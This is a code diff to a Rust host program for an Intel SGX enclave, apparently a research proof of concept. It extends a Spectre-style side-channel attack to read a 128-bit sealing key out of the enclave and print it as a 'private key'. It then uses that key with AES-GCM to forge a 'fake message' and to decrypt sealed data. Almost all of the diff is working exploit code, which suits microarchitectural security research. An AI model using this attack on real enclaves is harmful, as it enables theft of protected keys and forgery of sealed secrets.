@@ -19,6 +19,7 @@
 
 extern crate sgx_types;
 extern crate sgx_urts;
+
 use sgx_types::*;
 use sgx_urts::SgxEnclave;
 
@@ -38,11 +39,32 @@ use nix::unistd::Pid;
 extern crate libc;
 use libc::c_void;
 
+extern crate aes_gcm;
+use aes_gcm::aead::{generic_array::GenericArray, Aead, NewAead, Payload};
+use aes_gcm::Aes128Gcm;
+
 static ENCLAVE_FILE: &'static str = "enclave1.signed.so";
 
 extern "C" {
     fn Enclave1_get_secret_addr(eif: sgx_enclave_id_t, retval: *mut uint64_t) -> sgx_status_t;
-    fn Enclave1_spectre_enclave(eif: sgx_enclave_id_t, retval: *mut uint64_t) -> sgx_status_t;
+    fn Enclave1_get_key_addr(eif: sgx_enclave_id_t, retval: *mut uint64_t) -> sgx_status_t;
+    fn Enclave1_custom_seal_data(
+        eif: sgx_enclave_id_t,
+        retval: *mut sgx_status_t,
+        buf: *const u8,
+        buf_size: u32,
+        out_buf: *mut u8,
+        out_size: *mut u32,
+        out_tag: *mut sgx_aes_gcm_128bit_tag_t,
+    ) -> sgx_status_t;
+    fn Enclave1_custom_unseal_data(
+        eif: sgx_enclave_id_t,
+        retval: *mut sgx_status_t,
+        buf: *const u8,
+        buf_size: u32,
+        out_buf: *mut u8,
+        tag: *const sgx_aes_gcm_128bit_tag_t,
+    ) -> sgx_status_t;
     fn Enclave1_spectre_test(
         eif: sgx_enclave_id_t,
         measurement_array_addr: u64,
@@ -312,7 +334,7 @@ fn main() -> std::io::Result<()> {
     }
 
     let result =
-        unsafe { Enclave1_spectre_enclave(ENCLAVE.geteid(), &mut TARGET as *mut _ as *mut u64) };
+        unsafe { Enclave1_get_key_addr(ENCLAVE.geteid(), &mut TARGET as *mut _ as *mut u64) };
     if result != sgx_status_t::SGX_SUCCESS {
         return Err(std::io::Error::new(
             std::io::ErrorKind::Other,
@@ -328,6 +350,36 @@ fn main() -> std::io::Result<()> {
         minidow_secret_array_addr_in_enclave
     );
 
+    let message = "Do Not Go Gentle Into That Good Night00000000000".as_bytes();
+    let mut sealed_message = vec![0; 512];
+    let mut sealed_message_len = 0;
+    let mut out_tag = sgx_aes_gcm_128bit_tag_t::default();
+
+    let mut status = sgx_status_t::SGX_SUCCESS;
+    let result = unsafe {
+        Enclave1_custom_seal_data(
+            ENCLAVE.geteid(),
+            &mut status as *mut _,
+            &message[0] as *const u8,
+            message.len() as u32,
+            sealed_message.as_mut_ptr(),
+            &mut sealed_message_len as *mut _,
+            &mut out_tag as *mut _,
+        )
+    };
+    if result != sgx_status_t::SGX_SUCCESS {
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::Other,
+            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
+        ));
+    }
+    println!("{}", status);
+
+    println!(
+        "input: {:?}\noutput: {:?} of size {} bytes\ntag: {:?}",
+        message, sealed_message, sealed_message_len, out_tag
+    );
+
     println!("target: 0x{:x}", unsafe { TARGET });
 
     let spectre = Spectre::new(
@@ -337,34 +389,78 @@ fn main() -> std::io::Result<()> {
         Some(spectre_limit_addr as *const u8),
     );
 
-    println!(
-        "0x{:x}",
-        minidow::read_ptr(
-            &spectre,
-            || unsafe {
-                // try to prefetch, in the hoep it will help
-                std::arch::x86_64::_mm_prefetch(
-                    TARGET as *const i8,
-                    std::arch::x86_64::_MM_HINT_T0,
-                );
-            },
-            unsafe { TARGET }
-        )
+    let key_part_1 = minidow::read_ptr(
+        &spectre,
+        || unsafe {
+            // try to prefetch, in the hoep it will help
+            std::arch::x86_64::_mm_prefetch(TARGET as *const i8, std::arch::x86_64::_MM_HINT_T0);
+        },
+        unsafe { TARGET },
     );
-    println!(
-        "0x{:x}",
-        minidow::read_ptr(
-            &spectre,
-            || unsafe {
-                // try to prefetch, in the hoep it will help
-                std::arch::x86_64::_mm_prefetch(
-                    (TARGET + 8) as *const i8,
-                    std::arch::x86_64::_MM_HINT_T0,
-                );
-            },
-            unsafe { TARGET + 8 }
-        )
+    let key_part_2 = minidow::read_ptr(
+        &spectre,
+        || unsafe {
+            // try to prefetch, in the hoep it will help
+            std::arch::x86_64::_mm_prefetch(
+                (TARGET + 8) as *const i8,
+                std::arch::x86_64::_MM_HINT_T0,
+            );
+        },
+        unsafe { TARGET + 8 },
     );
+
+    let pkey_val = ((key_part_2 as u128) << 64) | key_part_1 as u128;
+    println!("Got private key: 0x{:x}", pkey_val);
+
+    let mut res_message = vec![0; 512];
+
+    let result = unsafe {
+        Enclave1_custom_unseal_data(
+            ENCLAVE.geteid(),
+            &mut status as *mut _,
+            sealed_message.as_ptr(),
+            sealed_message_len - std::mem::size_of::<sgx_types::sgx_key_id_t>() as u32,
+            res_message.as_mut_ptr(),
+            &out_tag as *const _,
+        )
+    };
+    if result != sgx_status_t::SGX_SUCCESS {
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::Other,
+            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
+        ));
+    }
+    println!("{}", status);
+
+    println!("{}", unsafe { String::from_utf8_unchecked(res_message) });
+
+    let nonce = GenericArray::from_slice(&[0; 12]);
+    let pkey = GenericArray::from(unsafe { std::mem::transmute::<u128, [u8; 16]>(pkey_val) });
+    let cipher = Aes128Gcm::new(&pkey);
+
+    let payload = Payload {
+        msg: b"fake message !!!",
+        aad: &sealed_message[sealed_message_len as usize
+            - std::mem::size_of::<sgx_types::sgx_key_id_t>()
+            ..sealed_message_len as usize],
+    };
+
+    let ciphertext = cipher.encrypt(nonce, payload).unwrap();
+    println!("{:?}", ciphertext);
+
+    let mut sealed_message_owned = sealed_message
+        [0..sealed_message_len as usize - std::mem::size_of::<sgx_types::sgx_key_id_t>()]
+        .to_owned();
+    sealed_message_owned.extend(&out_tag[0..16]);
+    let payload = Payload {
+        msg: sealed_message_owned.as_slice(),
+        aad: &sealed_message[sealed_message_len as usize
+            - std::mem::size_of::<sgx_types::sgx_key_id_t>()
+            ..sealed_message_len as usize],
+    };
+    let deciphered = cipher.decrypt(nonce, payload).unwrap();
+
+    println!("{}", unsafe { String::from_utf8_unchecked(deciphered) });
 
     unsafe {
         std::mem::take(&mut ENCLAVE).destroy();
